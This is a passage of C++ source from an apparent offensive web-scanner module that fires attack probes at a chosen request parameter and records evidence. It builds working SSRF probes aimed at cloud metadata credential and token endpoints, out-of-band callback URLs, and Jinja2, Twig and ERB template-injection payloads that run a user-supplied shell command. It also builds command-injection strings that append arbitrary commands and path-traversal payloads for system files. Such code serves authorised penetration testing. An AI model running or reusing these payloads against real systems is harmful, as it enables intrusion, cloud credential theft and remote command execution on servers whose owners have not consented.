    out.reserve(entries.size());
    for (const auto& entry : entries) {
        scanner::probe_t p;
        p.payload = entry;
        p.variant = variant.empty() ? set_id : variant;
        out.push_back(std::move(p));
    }
    return out;
}

bool body_contains_ci_local(const std::vector<uint8_t>& body, const std::string& needle)
{
    if (needle.empty() || body.empty() || needle.size() > body.size()) return false;
    const std::string n = lower_ascii(needle);
    for (size_t i = 0; i + n.size() <= body.size(); ++i) {
        bool matched = true;
        for (size_t j = 0; j < n.size(); ++j) {
            if (static_cast<char>(std::tolower(static_cast<unsigned char>(body[i + j]))) != n[j]) {
                matched = false;
                break;
            }
        }
        if (matched) return true;
    }
    return false;
}

struct delivery_result_t
{
    json attempts = json::array();
    std::vector<uint64_t> issue_ids;
    bool confirmed = false;
    std::string confirmed_variant;
    std::optional<exchange_observed_t> confirmed_response;
};

delivery_result_t deliver_probes(const request_context_t& ctx,
                                 const insertion_point_t& ip,
                                 const std::optional<exchange_observed_t>& baseline,
                                 const std::string& module_id,
                                 const std::vector<scanner::probe_t>& probes,
                                 run_limits_t& limits,
                                 bool stop_on_confirm,
                                 bool force_json_string)
{
    delivery_result_t result;
    const scanner::module_t* module = module_id.empty() ? nullptr : scanner::find(module_id);
    scanner::module_context_t mctx = make_module_context(ctx, baseline, limits);
    size_t issued = 0;
    for (const auto& probe : probes) {
        if (issued >= limits.max_payloads) break;
        if (now_ms() >= limits.deadline_ms) {
            limits.deadline_hit = true;
            break;
        }
        std::vector<uint8_t> raw;
        if (ip.build_with_options) {
            insertion_point_build_options_t options;
            options.force_json_string = force_json_string;
            raw = ip.build_with_options(probe.payload, options);
        } else if (ip.build) {
            raw = ip.build(probe.payload);
        } else {
            raw = ctx.raw_request;
        }
        json attempt;
        attempt["variant"] = probe.variant;
        attempt["payload_len"] = probe.payload.size();
        attempt["payload_hash"] = hash_text(probe.payload);
        if (!probe.marker.empty()) {
            attempt["marker_len"] = probe.marker.size();
            attempt["marker_hash"] = hash_text(probe.marker);
        }
        json send_err = json::object();
        const auto response = send_request(ctx, raw, limits, probe.variant.c_str(), &send_err);
        ++issued;
        if (!response.has_value()) {
            attempt["sent"] = true;
            attempt["response_received"] = false;
            attempt["error"] = send_err;
            result.attempts.push_back(std::move(attempt));
            continue;
        }
        attempt["sent"] = true;
        attempt["response_received"] = true;
        attempt["response"] = response_summary(*response, {probe.payload, probe.marker});
        attempt["delta"] = response_delta(baseline, *response);
        bool marker_seen = false;
        if (!probe.marker.empty()) {
            marker_seen = body_contains_ci_local(response->resp_body, probe.marker);
            attempt["marker_seen"] = marker_seen;
        }
        if (module && module->detect) {
            auto maybe_issue = module->detect(ip, probe, *response, mctx);
            if (maybe_issue.has_value()) {
                json evidence;
                evidence["source"] = "scanner_module";
                evidence["module_id"] = module_id;
                evidence["variant"] = probe.variant;
                evidence["marker_seen"] = marker_seen;
                evidence["response"] = attempt["response"];
                evidence["delta"] = attempt["delta"];
                sanitize_module_issue(*maybe_issue, ctx, ip, *response, probe, evidence);
                const uint64_t issue_id = add_issue(std::move(*maybe_issue));
                attempt["issue_id"] = issue_id;
                result.issue_ids.push_back(issue_id);
                result.confirmed = true;
                result.confirmed_variant = probe.variant;
                result.confirmed_response = *response;
                result.attempts.push_back(std::move(attempt));
                if (stop_on_confirm) break;
                continue;
            }
        }
        if (marker_seen) {
            result.confirmed = true;
            result.confirmed_variant = probe.variant;
            result.confirmed_response = *response;
            result.attempts.push_back(std::move(attempt));
            if (stop_on_confirm) break;
            continue;
        }
        result.attempts.push_back(std::move(attempt));
    }
    return result;
}

json issue_id_array(const std::vector<uint64_t>& ids)
{
    json out = json::array();
    for (uint64_t id : ids) out.push_back(id);
    return out;
}

void append_issue_ids(std::vector<uint64_t>& dst, const std::vector<uint64_t>& src)
{
    for (uint64_t id : src) dst.push_back(id);
}

std::string shell_single_quote(const std::string& value)
{
    std::string out;
    out.reserve(value.size() + 8);
    for (char c : value) {
        if (c == '\'') out += "'\"'\"'";
        else if (c == '\r' || c == '\n') out += ' ';
        else out.push_back(c);
    }
    return out;
}

std::string known_file_marker(const std::string& path)
{
    const std::string p = lower_ascii(path);
    if (p.find("passwd") != std::string::npos) return "root:";
    if (p.find("win.ini") != std::string::npos) return "[fonts]";
    if (p.find("web.xml") != std::string::npos) return "<web-app";
    if (p.find("manifest.mf") != std::string::npos) return "Manifest-Version";
    if (p.find("hosts") != std::string::npos) return "localhost";
    if (p.find("application.properties") != std::string::npos) return "spring.";
    if (p.find("log4j") != std::string::npos) return "log4j";
    return {};
}

std::string strip_drive_or_root(std::string path)
{
    std::replace(path.begin(), path.end(), '\\', '/');
    while (!path.empty() && path.front() == '/') path.erase(path.begin());
    if (path.size() > 2 && std::isalpha(static_cast<unsigned char>(path[0])) && path[1] == ':')
        path = path.substr(2);
    while (!path.empty() && path.front() == '/') path.erase(path.begin());
    return path;
}

std::vector<scanner::probe_t> traversal_payloads_for(const std::string& file_path,
                                                     bool windows,
                                                     bool encoding,
                                                     bool null_byte)
{
    std::vector<scanner::probe_t> probes;
    const std::string marker = known_file_marker(file_path);
    const std::string normalized = strip_drive_or_root(file_path);
    const std::string prefix = windows ? "..\\..\\..\\..\\" : "../../../../";
    const std::string slash_path = normalized;
    scanner::probe_t direct;
    direct.payload = file_path;
    direct.marker = marker;
    direct.variant = "direct";
    probes.push_back(direct);
    scanner::probe_t dotdot;
    dotdot.payload = prefix + slash_path;
    dotdot.marker = marker;
    dotdot.variant = windows ? "windows-dotdot" : "unix-dotdot";
    probes.push_back(dotdot);
    if (encoding) {
        scanner::probe_t enc;
        enc.payload = insertion_points::url_encode(dotdot.payload);
        enc.marker = marker;
        enc.variant = "url-encoded";
        probes.push_back(enc);
        scanner::probe_t dbl;
        dbl.payload = insertion_points::url_encode(enc.payload);
        dbl.marker = marker;
        dbl.variant = "double-url-encoded";
        probes.push_back(dbl);
    }
    if (null_byte) {
        scanner::probe_t nul;
        nul.payload = dotdot.payload + "%00";
        nul.marker = marker;
        nul.variant = "null-byte";
        probes.push_back(nul);
    }
    return probes;
}

std::vector<scanner::probe_t> metadata_targets_for_providers(const std::vector<std::string>& providers)
{
    std::vector<std::string> selected = providers;
    if (selected.empty()) selected.push_back("all");
    bool all = false;
    for (auto& p : selected) {
        p = lower_ascii(p);
        if (p == "all" || p == "auto") all = true;
    }
    auto want = [&](const char* provider) {
        if (all) return true;
        return std::find(selected.begin(), selected.end(), provider) != selected.end();
    };
    std::vector<scanner::probe_t> probes;
    auto add = [&](const std::string& payload, const std::string& marker, const std::string& variant) {
        scanner::probe_t p;
        p.payload = payload;
        p.marker = marker;
        p.variant = variant;
        probes.push_back(std::move(p));
    };
    if (want("aws")) {
        add("http://169.254.169.254/latest/meta-data/", "ami-id", "aws-imds-root");
        add("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "security-credentials", "aws-iam-roles");
        add("http://169.254.169.254/latest/dynamic/instance-identity/document", "instanceId", "aws-identity-document");
    }
    if (want("azure")) {
        add("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute", "azure-imds-instance");
    }
    if (want("gcp")) {
        add("http://metadata.google.internal/computeMetadata/v1/", "computeMetadata", "gcp-imds-root");
        add("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "access_token", "gcp-service-token");
    }
    if (want("alibaba")) add("http://100.100.100.200/latest/meta-data/", "instance-id", "alibaba-imds");
    if (want("oracle")) add("http://169.254.169.254/opc/v1/instance/", "region", "oracle-imds");
    if (want("digitalocean")) add("http://169.254.169.254/metadata/v1/id", "droplet_id", "digitalocean-imds");
    return probes;
}

std::string collaborator_url_for_token(const collaborator::token_info_t& token)
{
    if (!token.full_domain.empty()) return "http://" + token.full_domain + "/aida-oob";
    auto cfg = collaborator::current_config();
    if (!cfg.public_host.empty()) return "http://" + token.token + "." + cfg.public_host + "/aida-oob";
    return {};
}

std::optional<collaborator::token_info_t> issue_collaborator_token()
{
    const std::string token = collaborator::generate_token();
    if (token.empty())
        return std::nullopt;
    for (const auto& info : collaborator::list_tokens()) {
        if (info.token == token)
            return info;
    }
    collaborator::token_info_t info;
    info.token = token;
    const auto cfg = collaborator::current_config();
    if (!cfg.public_host.empty())
        info.full_domain = token + "." + cfg.public_host;
    info.issued_ms = now_ms();
    return info;
}

json interactions_to_json(const std::vector<collaborator::interaction_t>& interactions)
{
    json out = json::array();
    for (const auto& it : interactions) {
        json item;
        item["id"] = it.id;
        item["kind"] = it.kind;
        item["timestamp_ms"] = it.timestamp_ms;
        item["client_ip_hash"] = hash_text(it.client_ip);
        item["client_port"] = it.client_port;
        item["raw_len"] = it.raw.size();
        item["raw_hash"] = hash_text(it.raw);
        out.push_back(std::move(item));
    }
    return out;
}

json collaborator_token_json(const collaborator::token_info_t& token)
{
    json out;
    out["token_len"] = token.token.size();
    out["token_hash"] = hash_text(token.token);
    out["domain_hash"] = hash_text(token.full_domain);
    out["domain_len"] = token.full_domain.size();
    return out;
}

std::vector<std::string> collaborator_exact_redactions(const collaborator::token_info_t& token)
{
    std::vector<std::string> out;
    if (!token.token.empty()) out.push_back(token.token);
    if (!token.full_domain.empty()) out.push_back(token.full_domain);
    const std::string url = collaborator_url_for_token(token);
    if (!url.empty()) out.push_back(url);
    return out;
}

void store_result(const stored_result_t& record)
{
    auto& s = state();
    std::lock_guard<std::mutex> lk(s.mtx);
    if (s.results.find(record.task_id) == s.results.end()) s.order.push_back(record.task_id);
    s.results[record.task_id] = record;
    s.latest_task_id = record.task_id;
    while (s.order.size() > kMaxStoredResults) {
        const std::string victim = s.order.front();
        s.order.erase(s.order.begin());
        s.results.erase(victim);
    }
}

std::optional<stored_result_t> find_result(const std::string& task_id)
{
    auto& s = state();
    std::lock_guard<std::mutex> lk(s.mtx);
    std::string id = task_id;
    if (id.empty()) id = s.latest_task_id;
    auto it = s.results.find(id);
    if (it == s.results.end()) return std::nullopt;
    return it->second;
}

action_result_t ok_result(const std::string& message, json data)
{
    action_result_t r;
    r.success = true;
    r.message = message;
    r.data = std::move(data);
    return r;
}

action_result_t err_result(const std::string& message, const std::string& code = "invalid_request", json data = json::object())
{
    action_result_t r;
    r.success = false;
    r.message = message;
    r.code = code;
    r.data = std::move(data);
    return r;
}

run_limits_t limits_from_payload(const json& payload, uint64_t default_timeout)
{
    run_limits_t limits;
    limits.timeout_ms = json_u64_or(payload, "timeout_ms", default_timeout, 1000, kMaxTimeoutMs);
    limits.max_payloads = static_cast<size_t>(json_u64_or(payload, "max_payloads", kDefaultPayloadCap, 1, kMaxPayloadCap));
    limits.scope_only = json_bool_or(payload, "scope_only", true);
    limits.follow_redirects = json_bool_or(payload, "follow_redirects", false);
    limits.deadline_ms = now_ms() + limits.timeout_ms;
    return limits;
}

json start_result(const std::string& task_id, const std::string& action, uint64_t started_ms, const request_context_t& ctx)
{
    json out;
    out["task_id"] = task_id;
    out["action"] = action;
    out["started_ms"] = started_ms;
    out["target"] = {
        {"scheme", ctx.target.scheme},
        {"host", ctx.target.host},
        {"port", ctx.target.port},
        {"path_hash", hash_text(ctx.target.path)},
        {"path_len", ctx.target.path.size()}
    };
    out["request"] = {
        {"method", ctx.method},
        {"raw_len", ctx.raw_request.size()},
        {"raw_hash", hash_vector(ctx.raw_request)},
        {"insertion_points", ctx.insertion_points.size()}
    };
    return out;
}

void finish_result(json& out, const run_limits_t& limits, uint64_t started_ms, size_t issues_before, const std::vector<uint64_t>& issue_ids)
{
    const uint64_t ended = now_ms();
    out["ended_ms"] = ended;
    out["elapsed_ms"] = ended >= started_ms ? ended - started_ms : 0;
    out["issues_created"] = issue_id_array(issue_ids);
    out["status_deltas"] = {
        {"issues_before", issues_before},
        {"issues_after", issue_store::count()},
        {"issues_added_or_deduped", issue_ids.size()},
        {"requests_sent", limits.request_count},
        {"transport_failures", limits.transport_failures},
        {"deadline_hit", limits.deadline_hit}
    };
}

void persist_completed(const std::string& task_id, const std::string& action, uint64_t started_ms, const json& out)
{
    stored_result_t rec;
    rec.task_id = task_id;
    rec.action = action;
    rec.status = "completed";
    rec.started_ms = started_ms;
    rec.ended_ms = now_ms();
    rec.data = out;
    store_result(rec);
}

std::vector<scanner::probe_t> scanner_module_probes(const std::string& module_id,
                                                    const insertion_point_t& ip,
                                                    const request_context_t& ctx,
                                                    const std::optional<exchange_observed_t>& baseline,
                                                    run_limits_t& limits)
{
    std::vector<scanner::probe_t> out;
    const scanner::module_t* module = scanner::find(module_id);
    if (!module || !module->probes) return out;
    scanner::module_context_t mctx = make_module_context(ctx, baseline, limits);
    try {
        out = module->probes(ip, mctx);
    } catch (...) {
        diag::log_tagged_fmt("offensive_server_attack", "module_probes_exception module=%s", module_id.c_str());
    }
    return out;
}

json cloud_metadata_from_response(const exchange_observed_t& ex)
{
    std::string body(reinterpret_cast<const char*>(ex.resp_body.data()), ex.resp_body.size());
    json out = json::object();
    const std::string lc = lower_ascii(body);
    if (lc.find("iam") != std::string::npos || lc.find("accesskeyid") != std::string::npos || lc.find("security-credentials") != std::string::npos)
        out["cloud_provider_hint"] = "aws";
    else if (lc.find("azenvironment") != std::string::npos || lc.find("\"compute\"") != std::string::npos)
        out["cloud_provider_hint"] = "azure";
    else if (lc.find("computeMetadata") != std::string::npos || lc.find("service-accounts") != std::string::npos || lc.find("access_token") != std::string::npos)
        out["cloud_provider_hint"] = "gcp";
    else if (lc.find("droplet") != std::string::npos)
        out["cloud_provider_hint"] = "digitalocean";
    if (!out.empty()) {
        out["response_hash"] = hash_vector(ex.resp_body);
        out["response_size"] = ex.resp_body.size();
        out["sanitized_preview"] = response_summary(ex)["body_preview"];
    }
    return out;
}

bool looks_like_metadata(const exchange_observed_t& ex)
{
    json meta = cloud_metadata_from_response(ex);
    return !meta.empty();
}

action_result_t run_ssrf_like(const std::string& action, const json& payload, bool metadata_only)
{
    const std::string task_id = make_task_id(action);
    const uint64_t started = now_ms();
    const size_t issues_before = issue_store::count();
    run_limits_t limits = limits_from_payload(payload, metadata_only ? 30000 : 120000);
    std::string err;
    const bool require_param = has_param_target(payload);
    auto ctx_opt = build_request_context(payload, json_string_or(payload, "method", "GET"), "", require_param, err);
    if (!ctx_opt.has_value()) return err_result(err, "invalid_request");
    request_context_t ctx = *ctx_opt;
    const std::string param = param_target_or(payload);
    auto ip_opt = select_insertion_point(ctx, param, true);
    if (!ip_opt.has_value()) return err_result(param.empty() ? "no injectable parameter found" : "param_target not found", "missing_insertion_point");
    insertion_point_t ip = *ip_opt;
    json out = start_result(task_id, action, started, ctx);
    out["parameter"] = ip.name;
    out["insertion_point"] = ip.kind;
    out["bounded"] = {{"timeout_ms", limits.timeout_ms}, {"max_payloads", limits.max_payloads}, {"scope_only", limits.scope_only}};
    auto baseline = send_baseline(ctx, limits, out);

    std::vector<scanner::probe_t> probes;
    if (metadata_only) {
        probes = metadata_targets_for_providers(json_string_array(payload, "providers"));
    } else {
        auto explicit_targets = json_string_array(payload, "targets");
        const bool explicit_auto = explicit_targets.empty() ||
            (explicit_targets.size() == 1 && lower_ascii(explicit_targets.front()) == "auto");
        if (!explicit_auto) {
            for (const auto& target : explicit_targets) {
                scanner::probe_t p;
                p.payload = target;
                p.variant = "explicit-target";
                p.marker = lower_ascii(target).find("metadata") != std::string::npos ? "metadata" : "";
                probes.push_back(std::move(p));
            }
        } else {
            if (json_bool_or(payload, "cloud_metadata", true)) {
                auto metadata = metadata_targets_for_providers({"all"});
                probes.insert(probes.end(), metadata.begin(), metadata.end());
            }
            auto cloud_set = payload_entries_as_probes("ssrf/cloud_metadata_expanded", "payload-library:ssrf/cloud_metadata_expanded", 8);
            probes.insert(probes.end(), cloud_set.begin(), cloud_set.end());
            if (json_bool_or(payload, "internal_port_scan", true)) {
                auto loopback = payload_entries_as_probes("ssrf/internal_urls", "payload-library:ssrf/internal_urls", 8);
                probes.insert(probes.end(), loopback.begin(), loopback.end());
                std::vector<int> common_ports = {22, 25, 80, 443, 3306, 5432, 6379, 8080, 9200, 11211, 27017};
                const uint64_t start_port = json_u64_or(payload, "port_range_start", 1, 1, 65535);
                const uint64_t end_port = json_u64_or(payload, "port_range_end", 65535, 1, 65535);
                for (int port : common_ports) {
                    if (static_cast<uint64_t>(port) < start_port || static_cast<uint64_t>(port) > end_port) continue;
                    scanner::probe_t p;
                    p.payload = "http://127.0.0.1:" + std::to_string(port) + "/";
                    p.variant = "bounded-loopback-port-" + std::to_string(port);
                    p.marker = "";
                    probes.push_back(std::move(p));
                }
            }
        }
    }

    std::optional<collaborator::token_info_t> token;
    const bool use_collab = json_bool_or(payload, "use_collaborator", !metadata_only);
    if (use_collab && collaborator::is_running()) {
        token = issue_collaborator_token();
        const std::string url = token.has_value() ? collaborator_url_for_token(*token) : std::string();
        if (token.has_value() && !url.empty()) {
            scanner::probe_t p;
            p.payload = url;
            p.marker = token->token;
            p.variant = "collaborator-oob";
            probes.push_back(std::move(p));
            out["oob_token"] = collaborator_token_json(*token);
        } else {
            out["oob_unavailable"] = true;
        }
    } else if (use_collab) {
        out["oob_unavailable"] = true;
    }

    auto module_probes = scanner_module_probes("ssrf", ip, ctx, baseline, limits);
    probes.insert(probes.end(), module_probes.begin(), module_probes.end());
    delivery_result_t delivered = deliver_probes(ctx, ip, baseline, "ssrf", probes, limits, false, true);
    out["attempts"] = delivered.attempts;
    std::vector<uint64_t> issue_ids = delivered.issue_ids;
    bool confirmed = delivered.confirmed;
    json metadata = json::array();
    json possible_internal = json::array();
    for (const auto& attempt : delivered.attempts) {
        if (attempt.contains("response") && attempt["response"].is_object()) {
            const std::string variant = attempt.value("variant", std::string());
            if (variant.find("metadata") != std::string::npos || variant.find("imds") != std::string::npos) {
                if (attempt["response"].contains("body_preview") && !attempt["response"]["body_preview"].get<std::string>().empty()) {
                    metadata.push_back({{"variant", variant}, {"response", attempt["response"]}});
                }
            }
            if (variant.find("loopback") != std::string::npos || variant.find("127.0.0.1") != std::string::npos)
                possible_internal.push_back(attempt);
        }
    }
    if (delivered.confirmed_response.has_value() && looks_like_metadata(*delivered.confirmed_response)) {
        metadata.push_back(cloud_metadata_from_response(*delivered.confirmed_response));
        confirmed = true;
    }
    if (!metadata.empty()) out["metadata_evidence"] = metadata;
    if (!possible_internal.empty()) out["internal_access_timing_evidence"] = possible_internal;

    if (token.has_value()) {
        const auto interactions = collaborator::poll_by_token(token->token);
        out["oob_interactions"] = interactions_to_json(interactions);
        out["oob_interaction_count"] = interactions.size();
        if (!interactions.empty()) {
            confirmed = true;
            json evidence;
            evidence["token"] = collaborator_token_json(*token);
            evidence["interactions"] = interactions_to_json(interactions);
            const auto exact_redactions = collaborator_exact_redactions(*token);
            issue_t iss = make_sanitized_issue("blind-ssrf.collaborator-interaction",
                                               "Blind SSRF confirmed by collaborator interaction",
                                               severity_t::critical,
                                               confidence_t::certain,
                                               ctx,
                                               ip,
                                               delivered.confirmed_response,
                                               "The application made an outbound request to an AiDA collaborator token after the selected parameter was set to a generated callback URL.",
                                               "Allow-list outbound destinations, block cloud metadata and loopback/private ranges at egress, and proxy server-side fetches through a hardened fetch service.",
                                               {"CWE-918"},
                                               evidence,
                                               exact_redactions);
            issue_ids.push_back(add_issue(std::move(iss)));
        }
    }
    out["vulnerable"] = confirmed;
    out["internal_access_confirmed"] = confirmed && (!metadata.empty() || out.value("oob_interaction_count", 0UL) > 0);
    finish_result(out, limits, started, issues_before, issue_ids);
    persist_completed(task_id, action, started, out);
    return ok_result(confirmed ? "server-side request forgery evidence collected" : "no SSRF exploitation evidence confirmed", out);
}

std::vector<scanner::probe_t> ssti_rce_probes(const std::string& marker, const std::string& command)
{
    const std::string safe_marker_cmd = "echo " + marker;
    std::vector<std::string> commands = {safe_marker_cmd};
    if (!command.empty() && command != safe_marker_cmd) commands.push_back(command);
    std::vector<scanner::probe_t> probes;
    for (const auto& cmd : commands) {
        const std::string q = shell_single_quote(cmd);
        scanner::probe_t jinja;
        jinja.payload = "{{cycler.__init__.__globals__.os.popen('" + q + "').read()}}";
        jinja.marker = cmd == safe_marker_cmd ? marker : "";
        jinja.variant = cmd == safe_marker_cmd ? "jinja2-rce-marker" : "jinja2-rce-user-command";
        probes.push_back(std::move(jinja));
        scanner::probe_t twig;
        twig.payload = "{{['" + q + "']|filter('system')}}";
        twig.marker = cmd == safe_marker_cmd ? marker : "";
        twig.variant = cmd == safe_marker_cmd ? "twig-rce-marker" : "twig-rce-user-command";
        probes.push_back(std::move(twig));
        scanner::probe_t erb;
        erb.payload = "<%= `" + q + "` %>";
        erb.marker = cmd == safe_marker_cmd ? marker : "";
        erb.variant = cmd == safe_marker_cmd ? "erb-rce-marker" : "erb-rce-user-command";
        probes.push_back(std::move(erb));
    }
    return probes;
}

action_result_t run_ssti(const std::string& action, const json& payload)
{
    const std::string task_id = make_task_id(action);
    const uint64_t started = now_ms();
    const size_t issues_before = issue_store::count();
    run_limits_t limits = limits_from_payload(payload, 30000);
    std::string err;
    auto ctx_opt = build_request_context(payload, json_string_or(payload, "method", "GET"), "", true, err);
    if (!ctx_opt.has_value()) return err_result(err, "invalid_request");
    request_context_t ctx = *ctx_opt;
    const std::string param = param_target_or(payload);
    auto ip_opt = select_insertion_point(ctx, param, false);
    if (!ip_opt.has_value()) return err_result("param_target not found", "missing_insertion_point");
    insertion_point_t ip = *ip_opt;
    json out = start_result(task_id, action, started, ctx);
    out["parameter"] = ip.name;
    auto baseline = send_baseline(ctx, limits, out);
    std::vector<scanner::probe_t> probes = scanner_module_probes("ssti", ip, ctx, baseline, limits);
    const std::string engine = lower_ascii(json_string_or(payload, "template_engine", "auto"));
    if (engine != "auto") {
        probes.erase(std::remove_if(probes.begin(), probes.end(), [&](const scanner::probe_t& p) {
            return lower_ascii(p.variant).find(engine) == std::string::npos;
        }), probes.end());
    }
    std::string ssti_engine = engine;
    if (ssti_engine == "jinja") ssti_engine = "jinja2";
    if (ssti_engine == "free_marker") ssti_engine = "freemarker";
    if (ssti_engine == "vm") ssti_engine = "velocity";
    const std::string ssti_set = engine == "auto" ? std::string("ssti/detect") : std::string("ssti/") + ssti_engine;
    auto lib = payload_entries_as_probes(ssti_set, "payload-library:" + ssti_set, 8);
    if (lib.empty())
        lib = payload_entries_as_probes("ssti/all-engines", "payload-library:ssti/all-engines", 8);
    for (auto& p : lib) {
        if (p.payload.find("7*7") != std::string::npos) {
            p.marker = "49";
            probes.push_back(std::move(p));
        }
    }
    delivery_result_t detection = deliver_probes(ctx, ip, baseline, "ssti", probes, limits, true, true);
    out["detection_attempts"] = detection.attempts;
    std::vector<uint64_t> issue_ids = detection.issue_ids;
    bool vulnerable = detection.confirmed;
    bool rce_confirmed = false;
    if (vulnerable && json_u64_or(payload, "exploit_level", 3, 1, 3) >= 3) {
        const std::string marker = "AIDA_SSTI_" + base36(started);
        const std::string command = json_string_or(payload, "command", "id");
        auto rce = deliver_probes(ctx, ip, baseline, "", ssti_rce_probes(marker, command), limits, false, true);
        out["rce_attempts"] = rce.attempts;
        append_issue_ids(issue_ids, rce.issue_ids);
        for (const auto& attempt : rce.attempts) {
            if (attempt.value("marker_seen", false)) {
                rce_confirmed = true;
                vulnerable = true;
                break;
            }
        }
        if (rce_confirmed) {
            json evidence;
            evidence["marker"] = marker;
            evidence["attempts"] = rce.attempts;
            std::vector<std::string> exact_redactions = {command};
            issue_t iss = make_sanitized_issue("ssti.rce-confirmed",
                                               "Server-Side Template Injection with command execution",
                                               severity_t::critical,
                                               confidence_t::certain,
                                               ctx,
                                               ip,
                                               rce.confirmed_response,
                                               "A template expression executed a marker command and the marker appeared in the response.",
                                               "Never pass untrusted input to a template engine; use a sandboxed template mode without expression evaluation and isolate rendering from process execution APIs.",
                                               {"CWE-1336", "CWE-94"},
                                               evidence,
                                               exact_redactions);
            issue_ids.push_back(add_issue(std::move(iss)));
        }
        out["command_len"] = command.size();
        out["command_hash"] = hash_text(command);
    }
    out["vulnerable"] = vulnerable;
    out["rce_confirmed"] = rce_confirmed;
    out["template_engine"] = detection.confirmed_variant.empty() ? engine : detection.confirmed_variant;
    finish_result(out, limits, started, issues_before, issue_ids);
    persist_completed(task_id, action, started, out);
    return ok_result(vulnerable ? "SSTI evidence collected" : "no SSTI evidence confirmed", out);
}

std::vector<scanner::probe_t> cmdi_marker_probes(const insertion_point_t& ip, const std::string& marker)
{
    std::vector<scanner::probe_t> probes;
    const std::string base = ip.original_value;
    const std::vector<std::pair<std::string, std::string>> payloads = {
        {base + "; echo " + marker, "semicolon-echo"},
        {base + " && echo " + marker, "and-echo"},
        {base + " | echo " + marker, "pipe-echo"},
        {base + "%0Aecho " + marker, "newline-echo"},
        {base + "& echo " + marker, "windows-amp-echo"}
    };
    for (const auto& item : payloads) {
        scanner::probe_t p;
        p.payload = item.first;
        p.marker = marker;
        p.variant = item.second;
        probes.push_back(std::move(p));
    }
    return probes;
}

std::vector<scanner::probe_t> cmdi_user_command_probes(const insertion_point_t& ip, const std::string& command)
{
    std::vector<scanner::probe_t> probes;
    const std::string base = ip.original_value;
    const std::vector<std::pair<std::string, std::string>> payloads = {
        {base + "; " + command, "semicolon-command"},
        {base + " && " + command, "and-command"},
        {base + " | " + command, "pipe-command"},
        {base + "%0A" + command, "newline-command"},
        {base + "& " + command, "windows-amp-command"}
    };
    for (const auto& item : payloads) {
        scanner::probe_t p;
        p.payload = item.first;
        p.variant = item.second;
        probes.push_back(std::move(p));
    }
    return probes;
}

action_result_t run_cmdi(const std::string& action, const json& payload)
{
    std::string command;
    if (!json_string(payload, "command", command) || command.empty())
        return err_result("command required", "invalid_param");
    const std::string task_id = make_task_id(action);
    const uint64_t started = now_ms();
    const size_t issues_before = issue_store::count();
    run_limits_t limits = limits_from_payload(payload, 15000);
    std::string err;
    auto ctx_opt = build_request_context(payload, json_string_or(payload, "method", "GET"), "", true, err);
    if (!ctx_opt.has_value()) return err_result(err, "invalid_request");
    request_context_t ctx = *ctx_opt;
    auto ip_opt = select_insertion_point(ctx, param_target_or(payload), false);
    if (!ip_opt.has_value()) return err_result("param_target not found", "missing_insertion_point");
    insertion_point_t ip = *ip_opt;
    json out = start_result(task_id, action, started, ctx);
    out["parameter"] = ip.name;
    out["command_len"] = command.size();
    out["command_hash"] = hash_text(command);
    auto baseline = send_baseline(ctx, limits, out);
    std::vector<scanner::probe_t> probes = scanner_module_probes("cmdi", ip, ctx, baseline, limits);
    const std::string marker = "AIDA_CMDI_" + base36(started);
    auto marker_probes = cmdi_marker_probes(ip, marker);
    probes.insert(probes.end(), marker_probes.begin(), marker_probes.end());
    if (json_bool_or(payload, "filter_bypass", false)) {
        auto unix_adv = payload_entries_as_probes("cmdi/unix_advanced", "payload-library:cmdi/unix_advanced", 8);
        auto win_adv = payload_entries_as_probes("cmdi/windows_advanced", "payload-library:cmdi/windows_advanced", 8);
        auto bypass = payload_entries_as_probes("cmdi/filter_bypass", "payload-library:cmdi/filter_bypass", 8);
        probes.insert(probes.end(), unix_adv.begin(), unix_adv.end());
        probes.insert(probes.end(), win_adv.begin(), win_adv.end());
        probes.insert(probes.end(), bypass.begin(), bypass.end());
    }
    auto delivered = deliver_probes(ctx, ip, baseline, "cmdi", probes, limits, true, true);
    out["confirmation_attempts"] = delivered.attempts;
    std::vector<uint64_t> issue_ids = delivered.issue_ids;
    bool confirmed = delivered.confirmed;
    bool marker_confirmed = false;
    for (const auto& attempt : delivered.attempts) {
        if (attempt.value("marker_seen", false)) marker_confirmed = true;
    }
    if (marker_confirmed) {
        json evidence;
        evidence["marker"] = marker;
        evidence["attempts"] = delivered.attempts;
        std::vector<std::string> exact_redactions = {command};
        issue_t iss = make_sanitized_issue("cmdi.echo-marker",
                                           "Command Injection confirmed by echo marker",
                                           severity_t::critical,
                                           confidence_t::certain,
                                           ctx,
                                           ip,
                                           delivered.confirmed_response,
                                           "A shell echo marker appeared in the response after command-injection metacharacters were inserted into the selected parameter.",
                                           "Avoid invoking shells with user input; use argv-array process APIs and strict allow-list validation.",
                                           {"CWE-78"},
                                           evidence,
                                           exact_redactions);
        issue_ids.push_back(add_issue(std::move(iss)));
        confirmed = true;
        auto command_run = deliver_probes(ctx, ip, baseline, "", cmdi_user_command_probes(ip, command), limits, true, true);
        out["command_attempts"] = command_run.attempts;
    }
    out["vulnerable"] = confirmed;
    out["command_execution_confirmed"] = marker_confirmed || delivered.confirmed_variant.find("time") != std::string::npos;
    out["technique"] = delivered.confirmed_variant;
    finish_result(out, limits, started, issues_before, issue_ids);
    persist_completed(task_id, action, started, out);
    return ok_result(confirmed ? "command injection evidence collected" : "no command injection evidence confirmed", out);
}

action_result_t run_traversal_like(const std::string& action, const json& payload, bool lfi_mode)
{
    std::string file_path;
    if (!json_string(payload, "file_path", file_path) || file_path.empty())
        return err_result("file_path required", "invalid_param");
    const std::string task_id = make_task_id(action);
    const uint64_t started = now_ms();
    const size_t issues_before = issue_store::count();
    run_limits_t limits = limits_from_payload(payload, lfi_mode ? 30000 : 15000);
    std::string err;
    auto ctx_opt = build_request_context(payload, json_string_or(payload, "method", "GET"), "", true, err);
    if (!ctx_opt.has_value()) return err_result(err, "invalid_request");
    request_context_t ctx = *ctx_opt;
    auto ip_opt = select_insertion_point(ctx, param_target_or(payload), false);
    if (!ip_opt.has_value()) return err_result("param_target not found", "missing_insertion_point");
    insertion_point_t ip = *ip_opt;
    json out = start_result(task_id, action, started, ctx);
    out["parameter"] = ip.name;
    out["file_path_hash"] = hash_text(file_path);
    out["file_path_len"] = file_path.size();
    auto baseline = send_baseline(ctx, limits, out);
    const std::string os_type = lower_ascii(json_string_or(payload, "os_type", "auto"));
    const bool windows = os_type == "windows" || file_path.find('\\') != std::string::npos || (file_path.size() > 2 && file_path[1] == ':');
    std::vector<scanner::probe_t> probes = scanner_module_probes("path-traversal", ip, ctx, baseline, limits);
